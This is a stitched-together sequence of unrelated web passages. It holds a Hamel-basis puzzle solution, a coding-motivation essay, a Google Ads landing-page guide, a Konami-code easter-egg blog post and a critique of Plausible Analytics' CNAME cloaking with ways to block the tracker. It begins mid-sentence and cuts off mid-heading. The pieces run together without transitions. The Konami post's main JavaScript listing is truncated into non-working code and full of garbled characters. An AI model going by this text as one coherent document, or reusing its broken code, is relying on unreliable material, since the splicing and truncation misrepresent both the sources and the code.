across recently:
</p>

<div>
<p>
Define two periodic functions \( f \) and \( g \) from \( \mathbb{R} \)
to \( \mathbb{R} \) such that their sum \( f + g \) is the identity
function. The axiom of choice is allowed.
</p>
<p>
A function \( f \) is periodic if there exists \( p \gt 0 \) such that
\( f(x + p) = f(x) \) for all \( x \) in the domain.
</p>
</div>

<p>
<em>
If you want to think about this problem, this is a good time to pause
and think about it. There are spoilers ahead.
</em>
</p>


<h2 id="solution"><a href="#solution">Solution</a></h2>

<p>
The axiom of choice is equivalent to the statement that every vector
space has a basis. Since the set of real numbers \( \mathbb{R} \) is a
vector space over the set of rational numbers \( \mathbb{Q}, \) there
must be a basis \( \mathcal{H} \subseteq \mathbb{R} \) such that every
real number \( x \) can be written uniquely as a finite linear
combination of elements of \( \mathcal{H} \) with rational coefficients,
that is,
\[
  x = \sum_{a \in \mathcal{H}} x_a a
\]
where each \( x_a \in \mathbb{Q} \) and \( \{ a \in \mathcal{H} \mid x_a
\ne 0 \} \) is finite. The set \( \mathcal{H} \) is also known as the
Hamel basis.
</p>

<p>
In the above expansion of \( x, \) we use the notation \( x_a \) to
denote the rational number that appears as the coefficient of the basis
vector \( a. \) Therefore \( (x + y)_{a} = x_a + y_a \) for all \( x, y
\in \mathbb{R} \) and all \( a \in \mathcal{H}. \)
</p>

<p>
We know that \( b_a = 0 \) for distinct \( a, b \in \mathcal{H} \)
because \( a \) and \( b \) are basis vectors. Thus \( (x + b)_{a} = x_a
+ b_a = x_a + 0 = x_a \) for all \( x \in \mathbb{R} \) and distinct \(
a, b \in \mathcal{H}. \) This shows that a function \( f(x) = x_a \) is
a periodic function with period \( b \) for any \( a \in \mathcal{H} \)
and any \( b \in \mathcal{H} \setminus \{ a \}. \)
</p>

<p>
Let us define two functions:
\begin{align*}
  g(x) &amp; = \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a,
  &amp;
  h(x) &amp; = x_b b.
\end{align*}
where \( b \in \mathcal{H} \) and \( x \in \mathbb{R}. \) Now \( g(x) \)
is a periodic function with period \( b \) for any \( b \in \mathcal{H}
\) and \( h(x) \) is a periodic function with period \( c \) for any \(
c \in \mathcal{H} \setminus \{ b \}. \) Further,
\[
  g(x) + h(x)
  = \left( \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a \right) + x_b b
  = \sum_{a \in \mathcal{H}} x_a a
  = x.
\]
Thus \( g(x) \) and \( h(x) \) are two periodic functions such that
their sum is the identity function.
</p>

<p>Even if we haven't started learning a programming language yet, we already think we will fail instantly.</p>
<p>Why do we think like this?</p>
<p>There are can be a bunch of reasons:</p>
<ul>
<li>We think that it’s too difficult.</li>
<li>We think that we are not meant to code.</li>
<li>We think that it’s too late and we are too old.</li>
</ul>
<p>And the list goes on.</p>
<p>But let’s face the truth. All of them are just excuses. And behind every excuse, we hide a fear of failure. That is what is stopping us.</p>
<p>And <strong>we will never start anything when in our minds we think that we will fail.</strong></p>
<p>We tell ourselves, “Why do I even start something if I fail?” We have no reason to start because we think that we will not succeed. That is why we have a fear of programming. We think that we will not succeed.</p>
<p>To overcome this you should reprogram your brain to success.</p>
<p>Here is how.</p>

<p>Most people mislead talent with ages of practice. We always say “This person is talented” when we see higher than average results. When in fact, this person began to practice from an early age.</p>
<p><strong>It is very easy to defend our failures with the word “talented.”</strong></p>
<p>What you should do is to start practicing. Start to code for just 30 minutes every other day. It doesn’t matter how much you code at first, you just need to start doing it.</p>

<p>Most people start their coding journey from the wrong step. They chose the programming language first. But you need to start with a problem.</p>
<p>We don’t write code just to write code. We solve problems with the code.</p>
<p>So you should find some problems or projects that you are interested in. </p>
<p>Ask yourself, “Why do I want to start coding? What motivates me?”</p>
<p>After you find it, do some research to figure out which programming language is most appropriate for your project.</p>

<p>You don’t need to know 100% of the programming language to start coding or build things. Apply Pareto law.</p>
<p>The Pareto law states that for many outcomes roughly 80% of consequences come from 20% of the causes. In other words, with knowing 20% of the programming language you can build 80% of possible things (in reality numbers will differ.)</p>
<p>So start with the fundamentals of the programming language, and then go deeper into it if you need it.</p>
<p>I don’t recommend falling into the rabbit hole of some language specification at first. Your learning path can be extended for months. Start from basics then go deeper.</p>

<p>Learning more than one or two languages at once produces a lot of bad outcomes:</p>
<ul>
<li>You are distracting yourself.</li>
<li>You delay when you actually start building things.</li>
<li>You don’t see any big progress and start procrastinating.</li>
</ul>
<p>The cure is to pick one language and stick with it. Stop switching back and forth between programming languages. <strong>Multitasking is not working. </strong>Focus only on one thing at a time.</p>

<p>The fastest way to learn something is to practice.</p>
<p>For our brain, if you gain knowledge without applying it, it’s a waste of time. It will simply forget it. So you need to put your knowledge into practice.</p>
<p>Watching YouTube tutorials? Open text editor and code what you just learned.</p>
<p>Learning web development? Choose a small project and start building it.</p>
<p>Play and experiment.</p>

<p>Most of us instantly procrastinate when we open our to-do list and see a task like, “Create a website.” We know that it is very big. We know that we need to put a lot of effort into accomplishing it. So we just “Nah, maybe tomorrow.” but “tomorrow” never comes.</p>
<p>To defeat our laziness and start doing, we need to fool our brain. We need to convince him that it is very easy to do our task. Here is how.</p>
<p>Split your big task into small ones. Each small task should be completed in no more than 2-4 hours.</p>
<p>Todo list before:</p>
<p>Tasks:</p>
<ol>
<li>Create a website.</li>
</ol>
<p>Todo list after:</p>
<p>Tasks:</p>
<ol>
<li>Buy a domain name.</li>
<li>Create a website design in Figma.</li>
<li>Create a home page UI with CSS and HTML.</li>
<li>…</li>
</ol>
<p>Now, when you open your to-do list you need to take less effort to start when you know that each task takes a lot less than a couple of weeks.</p>
<p><strong>Without starting you will always be learning.</strong></p>

<p>And the last one, my favorite, the fear setting framework by Tim Ferris. He is an author of the New York Times bestseller The 4-Hour Workweek and host of one of the most popular podcasts in the world, the Tim Ferris show.</p>
<p>A fear setting framework can help you overcome your fear of coding and other fears that are holding your back.</p>
<p>Here is how to do it (<a target="_blank" href="https://mindfulambition.net/fear-setting-tim-ferriss/">full version</a>).</p>
<ol>
<li>Make three columns and label them “Define”, “Prevent”, and “Repair”.</li>
<li>In column one, define everything you fear about the idea of taking action.</li>
<li>In column two, list ways you could reduce the likelihood of each of the worst-case scenarios from happening.</li>
<li>In column three, list ways you could repair the damage if this situation were to come true.</li>
<li>Assess the impact of these worst-case scenarios on a scale of 1-10.</li>
<li>Assess the potential positive benefit of these successes on a 1-10 scale.</li>
<li>Make three columns on the page and label them 6 months, 1 year, and 3 years.</li>
<li>Write down the potential costs of inaction.</li>
</ol>

<p>I hope these seven pieces of advice can help you to start coding and achieve what you want.</p>

		<p>For very competitive keywords on Google Ads, you’ll generally find that the cost per click is very high. In the case of some of the SaaS clients that I’ve worked with, they’ve been as high as $75 for just one click!</p>



<p>To bring down the cost of acquisition as well as CPC, it’s best to have <strong>dedicated landing pages</strong> for highly competitive search terms on Google.</p>



<p>This will not only bring down your CPC rate but also get you better conversions.</p>



<p>In general, you want to have something that is <em>highly specific</em> to the search term and the <em>search intent</em>.</p>



<p>It’s good to consider the frame of mind that the user is in when they’re typing in their search query — the conversation that’s going through their head.</p>



<p>To make this a bit clearer, let’s go through an example. </p>



<hr>




<h2><span id="Landing_Page_Software_Example">Landing Page Software Example</span></h2>



<p>The first thing to do is to checkout the current Search Engine Results Pages (SERP) for your targeted search term. Let’s use the keywords “Landing Page Software” as an example.</p>



<figure><img data-attachment-id="1566" data-permalink="https://ruizhidong.com/best-practices-for-optimizing-a-landing-page-for-google-ads/landing_page_software_-_google_search/" data-orig-file="https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search.jpg?fit=1016%2C669&amp;ssl=1" data-orig-size="1016,669" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="landing_page_software_-_Google_Search" data-image-description="" data-medium-file="https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search.jpg?fit=300%2C198&amp;ssl=1" data-large-file="https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search.jpg?fit=900%2C593&amp;ssl=1" loading="lazy" width="900" height="593" src="https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search.jpg?resize=900%2C593&amp;ssl=1" alt="landing page software" srcset="https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search.jpg?w=1016&amp;ssl=1 1016w, https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search.jpg?resize=300%2C198&amp;ssl=1 300w, https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search.jpg?resize=768%2C506&amp;ssl=1 768w, https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search.jpg?resize=573%2C377&amp;ssl=1 573w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1"><figcaption><em>Landing Page Software </em>Search</figcaption></figure>



<p>Check out the current Google Ads (when it’s competitive, there will always be ads) and the landing page used for those ads. </p>



<p>You’ll see that for the first ad, Instapage is directing people to a <strong>dedicated landing page</strong> (https://instapage.com/products/landing-page-software) instead of the home page (https://instapage.com). </p>



<p>The second ad is a <strong>LIST</strong> of landing page software. </p>



<hr>



<h2><span id="What_Questions_Do_People_Ask">What Questions Do People Ask?</span></h2>



<p>If you scroll down the SERP, you’ll see a list of questions that people often ask:</p>



<figure><img data-attachment-id="1567" data-permalink="https://ruizhidong.com/best-practices-for-optimizing-a-landing-page-for-google-ads/landing_page_software_-_google_search-1/" data-orig-file="https://i2.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search-1.jpg?fit=758%2C393&amp;ssl=1" data-orig-size="758,393" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="landing_page_software_-_Google_Search-1" data-image-description="" data-medium-file="https://i2.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search-1.jpg?fit=300%2C156&amp;ssl=1" data-large-file="https://i2.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search-1.jpg?fit=758%2C393&amp;ssl=1" loading="lazy" width="758" height="393" src="https://i2.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search-1.jpg?resize=758%2C393&amp;ssl=1" alt="landing page questions" srcset="https://i2.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search-1.jpg?w=758&amp;ssl=1 758w, https://i2.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search-1.jpg?resize=300%2C156&amp;ssl=1 300w, https://i2.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search-1.jpg?resize=573%2C297&amp;ssl=1 573w" sizes="(max-width: 758px) 100vw, 758px" data-recalc-dims="1"><figcaption>Landing page questions</figcaption></figure>



<p>You’ll see that the first question is, “<em>What is the best landing page software?</em>“</p>



<p>Now if you look at the top organic search results for landing page software, you’ll see the following:</p>



<figure><img data-attachment-id="1568" data-permalink="https://ruizhidong.com/best-practices-for-optimizing-a-landing-page-for-google-ads/landing_page_software_-_google_search-2/" data-orig-file="https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search-2.jpg?fit=998%2C616&amp;ssl=1" data-orig-size="998,616" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="landing_page_software_-_Google_Search-2" data-image-description="" data-medium-file="https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search-2.jpg?fit=300%2C185&amp;ssl=1" data-large-file="https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search-2.jpg?fit=900%2C556&amp;ssl=1" loading="lazy" width="900" height="556" src="https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search-2.jpg?resize=900%2C556&amp;ssl=1" alt="Landing Page Software" srcset="https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search-2.jpg?w=998&amp;ssl=1 998w, https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search-2.jpg?resize=300%2C185&amp;ssl=1 300w, https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search-2.jpg?resize=768%2C474&amp;ssl=1 768w, https://i0.wp.com/ruizhidong.com/wp-content/uploads/2020/10/landing_page_software_-_Google_Search-2.jpg?resize=573%2C354&amp;ssl=1 573w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1"><figcaption>Organic Search Results for Landing Page Software</figcaption></figure>



<hr>



<h2><span id="Search_Intent">Search Intent</span></h2>



<p>You have a list of “<strong>11 Best Landing Page Builder</strong>” and “<strong>4 Best Landing Page</strong>” at the top.</p>



<p>What does this say about the search intent?</p>



<p>That people are <em>not decided</em>. People are in the research phase. </p>



<p>That’s why Google is choosing to serve the list pages and review pages at the top — because it’s what users of the search term find the most useful. That’s also why it’s a good exercise to check who’s ranked the highest on Google’s organic search results. </p>



<p>Another useful exercise you can do with AHREFs is to see if there have been any major moves in the ranks. This can point to something that works particularly well.</p>



<figure><img data-attachment-id="1569" data-permalink="https://ruizhidong.com/best-practices-for-optimizing-a-landing-page-for-google-ads/ahrefs_for_landing_page_software/" data-orig-file="https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?fit=1312%2C610&amp;ssl=1" data-orig-size="1312,610" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ahrefs_for_landing_page_software" data-image-description="" data-medium-file="https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?fit=300%2C139&amp;ssl=1" data-large-file="https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?fit=900%2C418&amp;ssl=1" loading="lazy" width="900" height="418" src="https://i2.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software-1024x476.jpg?resize=900%2C418&amp;ssl=1" alt="ahrefs landing page" srcset="https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?resize=1024%2C476&amp;ssl=1 1024w, https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?resize=300%2C139&amp;ssl=1 300w, https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?resize=768%2C357&amp;ssl=1 768w, https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?resize=573%2C266&amp;ssl=1 573w, https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1"><figcaption>ahrefs SERP position history</figcaption></figure>



<p>In this case, you can see that Instapage has made a recent and rapid entry onto the list with the title, “<em>The 17 Best Landing Page Software Tools for Marketers (2020</em>).”</p>



<p>You can also see that the very first result uses an odd number of 11 as well. Not particularly creative but enough to be interesting for clicking.</p>



<hr>



<h2><span id="Google_Ads_Creatives_and_Dedicated_Landing_Pages">Google Ads Creatives and Dedicated Landing Pages</span></h2>



<p>Coming back to our own Google Ads, we’d start with some ideas for headlines.</p>



<p>The good news here is that they all look more or less <em>the same</em>. That gives you an opportunity to <strong>stand out</strong> by trying a different angle and capture more of the market. </p>



<p>If you felt lazy, you can use the same formula and say, <strong><em>9 or 13 Best Landing Page Software Tools</em></strong> with a dedicated landing page for the Google Ad.</p>



<p>Or you can try something different. </p>



<p>Since we know what the search intent is, we can help that person along in their search process by answering the questions they have in their head.</p>



<p><em>Some ideas to start experimenting with:</em></p>



<ul><li>7 Must Haves for Landing Page Software</li><li>Elements of a Successful Landing Page</li><li>What Makes A Landing Page Convert?</li><li>Proven Landing Page Techniques</li><li>9 Landing Pages That Made A Million Dollars</li></ul>



<p>These are just a few headlines off the top of my head (you’re welcome to steal these).</p>



<p>The next step is to build the dedicated landing page.</p>



<p>The question as you’re building out the landing page is:</p>



<ul><li><em>Is this what the searcher is looking for? </em></li><li><em>Am I helping the reader out in their research process? </em></li><li><em>Am I providing content that’s relevant and useful? </em></li><li><em>Am I helping the reader figure out what the “best landing page” software is? </em></li></ul>



<p>The process for building your own landing page will be the same.</p>



<p>Do the research, figure out the search intent, come up with some ideas to experiment with, and then build the relevant landing pages.</p>

October 23, 2020 | https://www.amitmerchant.com/implement-konami-code-easter-egg/ | <a href="https://web.archive.org/web/*/https://www.amitmerchant.com/implement-konami-code-easter-egg/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>So, the other day, I was going through my Twitter feed and I saw <a href="https://twitter.com/avstorm/status/1280367397279608833?s=20">this tweet</a>. This user had explored an easter egg on the newly designed <a href="https://stripe.com/en-us">Stripe.com</a>â€™s website.</p>

<p>The easter egg is nothing but a sequence of different keypress known as <a href="https://en.wikipedia.org/wiki/Konami_Code">Konami Code</a> (<kbd>â†‘</kbd><kbd>â†‘</kbd><kbd>â†“</kbd><kbd>â†“</kbd><kbd>â†�</kbd><kbd>â†’</kbd><kbd>â†�</kbd><kbd>â†’</kbd><kbd>B</kbd><kbd>A</kbd>), which when achieved, can invoke this control panel at the bottom of the page.</p>

<p><a href="https://www.amitmerchant.com/images/stripe-konami-code.png"><img src="https://www.amitmerchant.com/images/stripe-konami-code.png" alt=""></a></p>

<p>Using this panel, you can play around with the gradients which are there at the top of the header. Things such as turn off different gradient colors, pause/play the animation, and so on.</p>

<blockquote>
  <p>The Konami Code (Japanese: ã‚³ãƒŠãƒŸã‚³ãƒžãƒ³ãƒ‰, Konami komando, â€œKonami commandâ€�) is a cheat code that appears in many Konami video games, and some non-Konami games. In the original code, the player can press the sequence of buttons (mentioned previously) on the game controller to enable a cheat or other effects.</p>
</blockquote>

<p>I found this so cool and I was tempted to implement something like this on my blog as well.</p>

<p>And it turns out, itâ€™s rather really simple to do so. Hereâ€™s the entire code in vanilla JavaScript which can invoke a cool Confetti upon pressing Konami code sequence.</p>

<div><div><pre><code><span>const</span> <span>keySequence</span> <span>=</span> <span>[];</span>

    <span>}</span>
<span>});</span>
</code></pre></div></div>

<p>Letâ€™s break down the code and understand whatâ€™s going on.</p>

<p>The variable <code>keySequence</code> is used to store the key sequence that the user on the site will press. The <code>konamiCode</code> is the variable that holds the actual Konami code as an array, which Iâ€™m using to match the key sequence later in the code. The <code>konamiString</code> is used to store the string form of the <code>konamiCode</code> array later in the code.</p>

<p>Next, Iâ€™ve registered an <a href="https://developer.mozilla.org/en-US/docs/Web/API/EventListener">event listener</a> which will listen to the <code>keyup</code> event. Inside the event listener, Iâ€™m storing the key sequence by pushing it into the <code>keySequence</code> variable through the following line of code.</p>



<p>The next line is important. The Konami code consists of only 10 keys. So, we donâ€™t want to store more than 10 keys into the <code>keySequence</code> as that would be overkill. For this, weâ€™re <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/splice">splicing</a> off the array from the reverse to the length of the Konami code with the following code like so.</p>

<div><div><pre><code><span>keySequence</span><span>.</span><span>splice</span><span>(</span>
    <span>-</span><span>konamiCode</span><span>.</span><span>length</span> <span>-</span> <span>1</span><span>,</span> 
    <span>keySequence</span><span>.</span><span>length</span> <span>-</span> <span>konamiCode</span><span>.</span><span>length</span>
<span>);</span>
</code></pre></div></div>

<p>The rest of the code is simple. All we need to do is convert both <code>keySequence</code> and <code>konamiCode</code> to string and compare both to invoke the easter egg like so.</p>

<div><div><pre><code><span>konamiString</span> <span>=</span> <span>konamiCode</span><span>.</span><span>join</span><span>(</span><span>''</span><span>);</span>

<span>if</span> <span>(</span><span>keySequence</span><span>.</span><span>join</span><span>(</span><span>''</span><span>).</span><span>includes</span><span>(</span><span>konamiString</span><span>))</span> <span>{</span>
    <span>// invoke the eater egg of your choice</span>
<span>}</span>
</code></pre></div></div>

<p>In the <code>if</code> condition, you can invoke whatever youâ€™d like. Iâ€™ve invoked a cool confetti effect on the page using <a href="https://agezao.github.io/confetti-js/">this library</a>. But you can choose to do invoke a host of other things. Like the one on <a href="https://stripe.com/en-us">Stripe.com</a>. The possibilities are endless!</p>

<p>But before that, try it out on here right now and feel the superpower! ðŸ˜‰</p>

<p>I hope you learned something new here and let me know in the comments what youâ€™d like to do with Konami code your site/blog/web app.</p>

<p>Until next time!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For the last few weeks, my feeds and federated timelines have been filled with absolutely brilliant marketing campaigns for Plausible Analytics, the new open-source privacy-focused website analytics tool. Plausible Analytics has enjoyed exponential growth and is frequently recommended by privacy-conscious voices in the FOSS community.</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io-663x317.png" alt="Plausible Analytics - elementary OS"></a><figcaption><p>Plausible Analytics showing public visitor metrics for the elementary OS website.</p></figcaption></figure><p>So does Plausible Analytics deliver on its promise to provide an ethical privacy-friendly alternative to Google Analytics? Let’s have a closer look.</p><p>Plausible Analytics claims to be compliant with GDPR, CCPA, and PECR out of the box. Allegedly, it’s not necessary to ask for and obtain user consent as no personal data is ever being collected.</p><p>Plausible Analytics does however admit that it collects your user-agent and IP address to uniquely identify your visit. Additionally, it stores information about your browser, operating system, device type, and location (based on your IP address). Even if the stored personal data is being anonymized (and not pseudonymized which sounds more likely), the data is still being processed.</p><p>If you’re familiar with GDPR, then you’re likely aware that it certainly covers collecting of online identifiers, such as IP addresses, and browser characteristics used for fingerprinting.</p><p>Another issue I came across when signing up for their service was that Plausible Analytics doesn’t provide their customers with a GDPR data processing agreement (DPA). When you, the website owner, allows a third party to collect and process personal data, you’re required to sign a DPA to be GDPR compliant.</p><h2 id="privacy-friendly-website-analytics">Privacy-friendly website analytics</h2><p>In my opinion, privacy-friendly should be more than a buzzword used to throw shade at Google Analytics. Here are a few key points that I attribute to being privacy-friendly (none of which are adhered to by Plausible Analytics):</p><ul><li>Ask users for their consent before tracking.</li><li>Allow users who don’t want to be tracked to opt-out.</li><li>Respect users providing a Do Not Track (DNT) header.</li><li>Don’t disguise your tracker as a first-party resource to avoid ad-blockers.</li></ul><p>Being privacy-friendly is also about respecting one’s right to choose what data to share, and with whom. Plausible Analytics seems to think that it’s alright to make that choice on your behalf and I wholeheartedly disagree.</p><h2 id="cname-cloaking">CNAME cloaking</h2><p>This abysmal technique remains ever popular with <a href="https://github.com/uBlockOrigin/uBlock-issues/issues/780" target="_blank">unethical advertisers</a> as an effective countermeasure against ad-blockers. The technique effectively disguises the third-party tracker as a first-party resource by having the website owner pointing a subdomain to the third-party server using a CNAME record.</p><p>Plausible Analytics are at least upfront about why they deploy CNAME cloaking, as explained in their documentation:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking-663x277.png" alt="Plausible Analytics - CNAME cloaking"></a><figcaption><p>Plausible Analytics documenting how to defeat ad-blockers.</p></figcaption></figure><p>What, some people are trying to block your privacy-friendly tracker? Now we can’t have that, tracking absolutely everyone gives Plausible Analytics a competitive edge against Google Analytics.</p><h3 id="how-does-cname-cloaking-work">How does CNAME cloaking work?</h3><p>An excellent question, but first we need to understand exactly what makes CNAMEs special by design and implementation as according to <a href="https://tools.ietf.org/html/rfc1034" target="_blank">rfc1034</a>.</p><blockquote><div><p>A CNAME RR identifies its name as an alias, and specifies the corresponding canonical name.</p><p>When a name server fails to find a desired RR in the resource set associated with the domain name, it checks to see if the resource set consists of a CNAME record with a matching class. If so, the name server includes the CNAME record in the response and restarts the query at the domain name specified in the data field of the CNAME record.</p></div></blockquote><p>Let’s see how it works by using the domain markosaric.com as an example. The domain is owned by Marko Saric, digital marketing guru of team Plausible Analytics. The subdomain he uses to disguise the tracker is ms.markosaric.com.
When performing a DNS query for ms.markosaric.com, we get the following response:</p><pre><code>$ dig ms.markosaric.com

;; ANSWER SECTION:
ms.markosaric.com.	14400	IN	CNAME	custom.plausible.io.
custom.plausible.io.	300	IN	A	46.101.161.209
</code></pre><p>As we can tell, the DNS resolver identifies ms.markosaric.com as an alias for custom.plausible.io. Additionally, because it’s a CNAME record, we also get the A record for custom.plausible.io which is pointing to 46.101.161.209.</p><p>When a browser requests the first-party resource for ms.markosaric.com, the same “DNS based redirect” takes place, and the tracker gets inserted from custom.plausible.io. However, because this happens at the DNS level, ad-blockers are unable to identify the tracker.</p><p>Let’s see how this dark magic repels uBlock Origin on Chromium after adding a custom filter to block the plausible.io domain.</p><pre><code>! Custom uBlock Origin filter for plausible.io
||plausible.io^
</code></pre><p>The image below consists of two merged screenshots. The left side of the image shows how the custom filter fails to stop the tracker when CNAME cloaking is in effect. The right side of the image shows the same filter successfully blocking the tracking domain when accessed directly:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak-663x232.png" alt="CNAME cloaking"></a><figcaption><p>CNAME cloaking used to escape filtering from uBlock Origin on Chromium.</p></figcaption></figure><p>As shown above, the tracker (index.js) is being loaded from the remote IP address of 46.101.161.209, which resolves to custom.plausible.io. However, the script is not blocked and the harvesting of personal data is in full effect.</p><p>This technique is effective because uBlock Origin doesn’t have access to DNS queries and is entirely oblivious to the trick being pulled behind its back. I wouldn’t describe this approach as being either privacy-friendly or ethical.</p><h2 id="how-to-block-plausible-analytics">How to block Plausible Analytics</h2><p>Though intrusive, unethical, and annoying, CNAME cloaking can be defeated. I’ll scratch the surface with a few options that will help you to protect your privacy.</p><h3 id="ublock-origin-on-firefox">uBlock Origin on Firefox</h3><p>You can easily block Plausible Analytics with uBlock Origin on Firefox by adding the filter I referenced earlier in this article. Firefox allows extensions (if given permission) to resolve domain names by exposing a <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dns" target="_blank">DNS API</a>. This allows uBlock Origin to identify and block disguised trackers:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png" alt="uBlock Origin on Firefox"></a><figcaption><p>uBlock Origin using Firefox’s DNS API to expose and block CNAME cloaking.</p></figcaption></figure><h3 id="dnscrypt-proxy">dnscrypt-proxy</h3><p>If you don’t want to use Firefox, or prefer to block Plausible Analytics on the DNS level, then you’ll need a tool that can scrub CNAME responses. The right tool for the job in my opinion is <a href="https://github.com/DNSCrypt/dnscrypt-proxy" target="_blank">dnscrypt-proxy</a>. The dnscrypt-proxy client’s domain blacklist provides support for CNAME blocking.</p><p>The following animated gif shows how dnscrypt-proxy can block the CNAME record containing the unwanted tracker.</p><p><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/dnscrypt-proxy-cname-blacklist.gif" alt="dnscrypt-prox blocking a cloaked CNAME record" title="Blocking Plausible Analytics with dnscrypt-proxy"></p><p>Pretty neat huh.</p><h3 id="other-options">Other options</h3><p>Well there are a few, you could always:</p><ul><li>Block any IP address in use by custom.plausible.io with your firewall.</li><li>Disable JavaScript in your browser (it will block the tracking, not the connection).</li><li>Block the <a href="https://github.com/rogercomply/plausible-analytics-blocklist/blob/master/subdomains" target="_blank" rel="noopener noreferrer nofollow" title="A list of subdomains used for CNAME cloaking with Plausible Analytics">subdomains</a> used for CNAME cloaking.</li><li>Use a DNS service provider already blocking unwanted trackers.</li><li>Ask Plausible Analytics to respect your right to privacy.</li></ul><h2 id="what-does-the-foss-say">What does the FOSS 